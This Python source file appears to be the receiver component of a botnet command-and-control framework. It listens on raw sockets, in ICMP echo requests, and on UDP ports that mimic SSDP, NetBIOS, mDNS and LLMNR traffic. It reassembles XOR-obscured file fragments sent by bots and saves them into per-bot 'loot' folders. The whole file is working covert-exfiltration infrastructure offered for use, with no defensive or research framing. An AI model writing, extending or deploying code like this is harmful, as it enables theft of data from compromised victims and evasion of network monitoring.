import socket
import threading
import binascii
import time
import os
from core.network.state import sessions, lock

# session structure: {(botid,fileid): {'fragments':{}, 'expected':None, 'crc':None, 'start':ts}}


def _parse_payload(data: bytes):
    # expected header: botlen(1)|botid|flen(1)|fileid|seq(2)|flags(1)|payload
    try:
        if len(data) < 5:
            return None
        idx=0
        botlen = data[idx]; idx+=1
        botid = data[idx:idx+botlen].decode('utf-8'); idx+=botlen
        flen = data[idx]; idx+=1
        fileid = data[idx:idx+flen].decode('utf-8'); idx+=flen
        seq = int.from_bytes(data[idx:idx+2],'little'); idx+=2
        flags = data[idx]; idx+=1
        payload = data[idx:]
        eof = bool(flags & 1)
        return botid,fileid,seq,eof,payload
    except Exception:
        return None


def _handle_fragment(botid,fileid,seq,eof,payload,channel='UDP'):
    key = int(time.time()//60)
    # decrypt by rolling xor with key
    decrypted = bytes(b ^ (key & 0xFF) for b in payload)
    with lock:
        sess = sessions.setdefault((botid,fileid),{'fragments':{},'crc':None,'start':time.time(),'channel':channel})
        sess['fragments'][seq]=decrypted
        sess['channel']=channel
        if eof:
            # assemble
            chunks = [sess['fragments'][i] for i in sorted(sess['fragments'])]
            data = b''.join(chunks)
            # compute crc
            crc = binascii.crc32(data) & 0xffffffff
            sess['crc'] = crc
            # write file
            outdir = os.path.join('loot',botid)
            os.makedirs(outdir,exist_ok=True)
            fname = f"{int(time.time())}_{fileid}.dat"
            path = os.path.join(outdir,fname)
            with open(path,'wb') as f:
                f.write(data)
            sess['path']=path
            sess['complete']=True
            # trigger ack signal
            from core.network.beacon import ack_signal
            ack_signal.set()


def _listen_raw():
    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        raw.bind(("0.0.0.0",0))
        raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        # enable promiscuous receive on Windows
        try:
            raw.ioctl(0x98000001, 1)  # SIO_RCVALL, RCVALL_ON
        except Exception:
            pass
    except Exception:
        return
    while True:
        pkt, addr = raw.recvfrom(65535)
        if len(pkt) < 20:
            continue
        proto = pkt[9]
        if proto == 17:  # UDP
            ihl = (pkt[0]&0xf)*4
            data = pkt[ihl+8:]
            parsed = _parse_payload(data)
            if parsed:
                _handle_fragment(*parsed,'UDP')
        elif proto == 1:  # ICMP
            ihl = (pkt[0]&0xf)*4
            icmp_type = pkt[ihl]
            if icmp_type == 8:
                data = pkt[ihl+8:]
                parsed = _parse_payload(data)
                if parsed:
                    _handle_fragment(*parsed,'ICMP')

def _listen_udp():
    ports = [1900,137,5353,5355]
    socks = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("", p))
            # join multicast groups so we pickup traffic sent to the standard
            # mDNS/SSDP addresses during testing and when the framework is active
            if p == 5353:
                try:
                    mreq = socket.inet_aton('224.0.0.251') + socket.inet_aton('0.0.0.0')
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
                except Exception:
                    pass
            elif p == 1900:
                try:
                    mreq = socket.inet_aton('239.255.255.250') + socket.inet_aton('0.0.0.0')
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
                except Exception:
                    pass
            socks.append(s)
        except Exception:
            pass
    if not socks:
        return
    while True:
        # simple round-robin
        for s in socks:
            try:
                s.settimeout(0.1)
                data, addr = s.recvfrom(4096)
                parsed = _parse_payload(data)
                if parsed:
                    _handle_fragment(*parsed,'UDP')
            except socket.timeout:
                continue
            except Exception:
                continue


def clear_sessions(age: float = None):
    """Remove completed sessions older than *age* seconds.
    If *age* is None, all sessions are cleared.
    """
    with lock:
        if age is None:
            sessions.clear()
        else:
            now = time.time()
            for k, sess in list(sessions.items()):
                if sess.get('complete') and now - sess.get('start', now) >= age:
                    del sessions[k]


def _cleanup_task():
    # periodically purge old completed sessions to conserve memory
    while True:
        time.sleep(300)
        clear_sessions(age=300)


def start_receiver():
    t1 = threading.Thread(target=_listen_raw, daemon=True)
    t2 = threading.Thread(target=_listen_udp, daemon=True)
    t1.start()
    t2.start()
    # spawn cleanup thread as daemon
    tc = threading.Thread(target=_cleanup_task, daemon=True)
    tc.start()
    return t1, t2


def list_loot():
    with lock:
        out=[]
        for (bot,fileid),sess in sessions.items():
            if sess.get('complete'):
                out.append({'bot':bot,'fileid':fileid,'path':sess.get('path'),'crc':sess.get('crc'),'status':'OK','channel':sess.get('channel')})
            else:
                out.append({'bot':bot,'fileid':fileid,'status':'INCOMPLETE','channel':sess.get('channel')})
        return out
